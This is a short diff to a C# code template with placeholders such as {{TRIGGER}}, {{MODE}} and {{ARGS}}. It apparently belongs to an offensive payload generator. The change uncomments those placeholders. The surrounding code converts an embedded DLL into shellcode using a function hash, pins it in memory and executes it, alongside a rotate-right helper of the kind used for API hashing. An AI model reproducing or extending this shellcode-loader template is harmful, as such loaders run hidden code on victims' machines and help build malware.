@@ -273,8 +273,8 @@ namespace {{NAMESPACE}}
 
         static void Main(string[] args)
         {
-            //{{TRIGGER}}
-            //{{MODE}}
+            {{TRIGGER}}
+            {{MODE}}
 
             byte[] payload = ConvertToSC(dllContents, functionHash, userData, flags);
             GCHandle SCHandle = GCHandle.Alloc(payload, GCHandleType.Pinned);
@@ -287,7 +287,7 @@ namespace {{NAMESPACE}}
                 executesc();
             }
         }
-        //{{ARGS}}
+        {{ARGS}}
         static uint Ror(uint val, int r_bits, int max_bits)
         {
             return (val >> r_bits) | (val << (max_bits - r_bits));
